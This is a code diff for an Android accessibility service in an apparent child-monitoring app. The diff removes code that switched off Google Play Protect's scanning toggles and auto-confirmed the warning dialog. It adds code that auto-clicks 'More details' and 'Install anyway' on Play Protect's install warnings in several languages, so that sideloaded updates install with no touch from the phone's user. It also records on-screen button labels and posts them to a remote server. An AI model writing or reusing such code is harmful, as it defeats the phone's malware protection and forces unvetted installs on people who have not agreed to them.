@@ -332,14 +332,6 @@ class EnforcementService : AccessibilityService() {
             "com.miui.packageinstaller", "com.samsung.android.packageinstaller"
         )
 
-        /** Play Protect settings/confirmation windows (vc17 "protect" step) — scan
-         *  toggle OFF flip sirf in packages ki windows par, aur sirf jab screen par
-         *  "protect" text visible ho (random toggle flip se bachne ke liye).
-         *  ALLOW_PKGS me com.android.vending JAAN-BOOJH kar NAHI hai (Play Store ki
-         *  windows par install/update labels kabhi auto-click na hon) — protect ka
-         *  package-gate alag, sirf is step ke liye hai. */
-        val PROTECT_PKGS = setOf("com.android.vending", "com.google.android.gms")
-
         /** Packages that may host the MediaProjection consent dialog. */
         private val PROJECTION_DIALOG_PKGS = ALLOW_PKGS + setOf(
             "com.miui.securitycenter", "com.miui.home",
@@ -396,14 +388,17 @@ class EnforcementService : AccessibilityService() {
                 "अपडेट करें", "अपडेट", "फिर भी इंस्टॉल करें", "फिर भी अपडेट करें",
                 "安装", "仍然安装", "继续安装", "更新", "仍然更新"
             ),
-            // VC17 Play Protect OFF: toggle flip ke baad Play Store confirmation
-            // dialog ("Turn off app scanning?") ka positive button. Toggle khud
-            // Switch node hai — clickProtectPass usko flip karta hai, ye labels
-            // sirf confirm dialog ke buttons ke liye. English + Hindi + Chinese.
-            "protect" to setOf(
-                "turn off", "ok", "turn off scanning",
-                "बंद करें", "बंद करें?", "टर्न ऑफ",
-                "关闭", "确定"
+            // VC18: Play Protect ka install-time dialog do-step ka hai — pehle
+            // "More details" tap karna padta hai, uske baad "Install anyway"
+            // dikhta hai. Ye LOWER-priority labels hain: install branch pehle
+            // clickExact("install") try karta hai, fail hone par tabhi pp_more
+            // (warna jab "Install anyway" already dikhe to bekar ka details
+            // expand hota). Sirf ALLOW_PKGS (installer/gms) windows par, exact
+            // match — galat label par kabhi click nahi.
+            "pp_more" to setOf(
+                "more details", "more info", "see details",
+                "और अधिक जानकारी", "अधिक जानकारी", "ज़्यादा जानकारी",
+                "更多详情", "了解详情"
             )
         )
     }
@@ -614,6 +609,10 @@ class EnforcementService : AccessibilityService() {
     private fun attemptGrant(n: Int) {
         val step = Store.autoClickStep
         if (step.isBlank() || SystemClock.elapsedRealtime() > Store.autoClickUntil) {
+            // VC18: install window khatam — bane hue snapshots server par bhejo
+            // (best-effort). Popup phir se manual click hua to /apk/diag se
+            // exact reason milega (kaunsi screen, kaunse labels, click hua?).
+            if (step == "install") flushInstallDiag()
             grantAttempts = 0
             return
         }
@@ -641,10 +640,15 @@ class EnforcementService : AccessibilityService() {
             // VC16: "Update"/"Install" ke alawa install-complete screen ka "Done"
             // bhi khud click — zero-touch finish (warna "App installed" screen
             // bachche ke phone par khadi reh jaati hai).
-            "install" -> clickExact(step) || clickInstallDone()
-            // VC17 Play Protect OFF: scan + improve-detection toggles flip (OFF).
-            // Package-gated (vending/gms) + screen-text gate — clickProtectPass.
-            "protect" -> clickProtectPass() || clickExact(step)
+            // VC18: Play Protect dialog do-step ka hai — "More details" tabhi
+            // click karo jab install-variant koi nahi mila (priority saaf).
+            // Har pass ka snapshot diag ring me jata hai — fail hua to server
+            // /apk/diag par EXACT pata chalega kaunsi screen par kya labels the.
+            "install" -> {
+                val ok = clickExact(step) || clickExact("pp_more") || clickInstallDone()
+                noteInstallDiag(if (ok) "clicked" else "none")
+                ok
+            }
             else -> clickExact(step)
         }
     }
@@ -679,14 +683,6 @@ class EnforcementService : AccessibilityService() {
             "notif" -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
             // Install-unknown-apps: silent APK update ke liye zaroori
             "unknown" -> runCatching { ctx.packageManager.canRequestPackageInstalls() }.getOrDefault(false)
-            // VC17 Play Protect: Settings.Secure "package_verifier_user_consent"
-            // 0 = scan OFF (Play Protect toggle isi ko likhta hai). 1 = abhi ON.
-            // Missing (-1) = padh nahi paye — done NAHI maano (toggle flip hoga).
-            "protect" -> runCatching {
-                android.provider.Settings.Secure.getInt(
-                    ctx.contentResolver, "package_verifier_user_consent", -1
-                ) == 0
-            }.getOrDefault(false)
             // install/uninstall steps kabhi "done" nahi hote — click hi success hai
             else -> false
         }
@@ -743,49 +739,95 @@ class EnforcementService : AccessibilityService() {
         return false
     }
 
-    /** VC17 Play Protect OFF — ek pass: saari windows me se vending/gms windows
-     *  lo, screen par "protect" text confirm karo (Play Protect screen hi hai),
-     *  phir CHECKED switches flip karo (scan + improve-detection dono OFF hone
-     *  tak). Confirmation dialog ka "Turn off" clickExact("protect") handle karta
-     *  hai. Safety: bina "protect" text ke koi switch kabhi flip nahi hota —
-     *  random Play Store screen par toggle galti se nahi chhedenge. */
-    private fun clickProtectPass(): Boolean {
-        return runCatching {
+    // ---- VC18 install-flow diagnostics ----
+
+    /** Install window ke dauran 1/sec snapshot ring: kaunsi a11y windows khuli
+     *  thin, unme kaunse button labels the, pass ne click kiya ya nahi. Window
+     *  expire hone par flush /apk/diag ko POST hota hai (best-effort) —
+     *  "update popup abhi bhi manual kyu?" ka exact jawab server se padhne ke
+     *  liye (kaunsi screen atki, kaunse labels dikhe, click hua ya nahi). */
+    private val installDiagPasses = ArrayDeque<String>()
+    private var installDiagLastAt = 0L
+
+    private fun noteInstallDiag(result: String) {
+        runCatching {
+            val now = SystemClock.elapsedRealtime()
+            if (now - installDiagLastAt < 1000L) return
+            installDiagLastAt = now
+            val wins = com.google.gson.JsonArray()
             val roots = mutableListOf<AccessibilityNodeInfo>()
             rootInActiveWindow?.let { roots.add(it) }
             windows?.forEach { w -> runCatching { w.root?.let { r -> roots.add(r) } } }
-            var acted = false
+            var count = 0
             for (root in roots) {
-                val pkg = root.packageName?.toString() ?: continue
-                if (pkg !in PROTECT_PKGS) continue
-                // Screen-text gate: Play Protect screen par "protect" word hota hai
-                val looksRight = runCatching {
-                    root.findAccessibilityNodeInfosByText("protect").isNotEmpty()
-                }.getOrDefault(false)
-                if (!looksRight) continue
-                for (sw in collectCheckables(root, 300)) {
-                    if (sw.isCheckable && sw.isChecked && clickDeep(sw)) acted = true
-                }
+                if (count >= 8) break
+                count++
+                val w = com.google.gson.JsonObject()
+                w.addProperty("pkg", root.packageName?.toString() ?: "?")
+                w.add("btns", collectDiagLabels(root))
+                wins.add(w)
             }
-            acted
-        }.getOrDefault(false)
+            val p = com.google.gson.JsonObject()
+            p.addProperty("ts", System.currentTimeMillis())
+            p.addProperty("r", result)
+            p.add("w", wins)
+            installDiagPasses.addLast(p.toString())
+            while (installDiagPasses.size > 24) installDiagPasses.removeFirst()
+        }
     }
 
-    /** Tree-walk: saare checkable nodes (switch/toggle/checkbox) — budget-capped. */
-    private fun collectCheckables(node: AccessibilityNodeInfo, budget: Int): List<AccessibilityNodeInfo> {
-        val out = mutableListOf<AccessibilityNodeInfo>()
-        val stack = ArrayDeque<AccessibilityNodeInfo>()
-        stack.add(node)
-        var visited = 0
-        while (stack.isNotEmpty() && visited < budget) {
-            val n = stack.removeFirst()
-            visited++
-            if (n.isCheckable) out.add(n)
-            for (i in 0 until n.childCount) {
-                runCatching { n.getChild(i) }.getOrNull()?.let { stack.add(it) }
+    /** Tree-walk: clickable/Button nodes ke texts (cap 12, 48 chars) — diag. */
+    private fun collectDiagLabels(root: AccessibilityNodeInfo): com.google.gson.JsonArray {
+        val out = LinkedHashSet<String>()
+        runCatching {
+            val stack = ArrayDeque<AccessibilityNodeInfo>()
+            stack.add(root)
+            var visited = 0
+            while (stack.isNotEmpty() && visited < 150 && out.size < 12) {
+                val n = stack.removeFirst()
+                visited++
+                val cls = n.className?.toString().orEmpty()
+                if (n.isClickable || cls.contains("Button")) {
+                    val t = (n.text ?: n.contentDescription)?.toString()?.trim().orEmpty()
+                    if (t.isNotEmpty()) out.add(t.take(48))
+                }
+                for (i in 0 until n.childCount) {
+                    runCatching { n.getChild(i) }.getOrNull()?.let { stack.add(it) }
+                }
             }
         }
-        return out
+        val arr = com.google.gson.JsonArray()
+        out.forEach { arr.add(com.google.gson.JsonPrimitive(it)) }
+        return arr
+    }
+
+    /** Window expire — ring ka content /apk/diag par POST (throwaway thread,
+     *  main a11y loop kabhi block na ho). Fail hone par chupchap drop. */
+    private fun flushInstallDiag() {
+        if (installDiagPasses.isEmpty()) return
+        val body = com.google.gson.JsonObject()
+        body.addProperty("type", "install_diag")
+        body.addProperty("at", System.currentTimeMillis())
+        body.addProperty(
+            "vc", runCatching {
+                val pi = applicationContext.packageManager
+                    .getPackageInfo(applicationContext.packageName, 0)
+                if (android.os.Build.VERSION.SDK_INT >= 28) pi.longVersionCode
+                else @Suppress("DEPRECATION") pi.versionCode.toLong()
+            }.getOrDefault(0L)
+        )
+        val arr = com.google.gson.JsonArray()
+        while (installDiagPasses.isNotEmpty()) {
+            arr.add(com.google.gson.JsonPrimitive(installDiagPasses.removeFirst()))
+        }
+        body.add("passes", arr)
+        Thread {
+            runCatching {
+                kotlinx.coroutines.runBlocking {
+                    com.familyguard.child.data.Api.postInstallDiag(body)
+                }
+            }
+        }.start()
     }
 
     /** Update/install complete hone par installer ka "App installed / Update
